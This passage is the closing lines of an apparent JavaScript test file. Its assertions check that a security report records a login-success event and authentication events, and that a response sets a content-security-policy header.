      expect(securityReport.eventTypes).toContain('LOGIN_SUCCESS');
      expect(securityReport.authenticationEvents).toBeGreaterThan(0);
      expect(normalResponse.headers['content-security-policy']).toBeDefined();
    });
  });
});